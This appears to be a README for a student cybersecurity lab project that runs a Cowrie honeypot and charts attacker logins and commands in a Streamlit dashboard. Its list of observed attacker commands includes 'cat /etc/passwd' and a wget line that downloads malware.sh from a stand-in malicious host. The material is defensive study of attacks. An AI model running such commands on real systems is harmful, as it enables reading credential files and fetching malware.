#Cowrie Honeypot Threat Intelligence Dashboard
## Overview
A cybersecurity lab project that uses Cowrie honeypot to capture real-world attacker behavior, parse Cowrie JSON logs with Python, and visualize attacker IPs and command activity in a Streamlit dashboard.
## Feature
- Captures attacker login attempts
- Logs attacker commands
- Parses Cowrie JSON logs using Python
- Visualizes attacker behavior with Matplotlib
- Displays attacker IPs and command activity in a Streamlit dashboard

## Key Insights
- Identified common attacker reconnaissance commands (whoami, uname, ls)
- Observed credential harvesting attempts (/etc/passwd access)
- Captured automated attack behavior via wget malware download attempts

## Tools Used
- Cowrie
- Python
- Matplotlib
- Streamlit
- Ubuntu VM

## Sample Attacker Commands Observed
- whoami
- uname -a
- ls
- pwd
- cat /etc/passwd
- wget http://malicious.com/malware.sh

## Sample Dashboard
![Top Commands](screenshots/commands.png)

## Files
- parser.py
- visualize.py
- dashboard.py
- commands.png


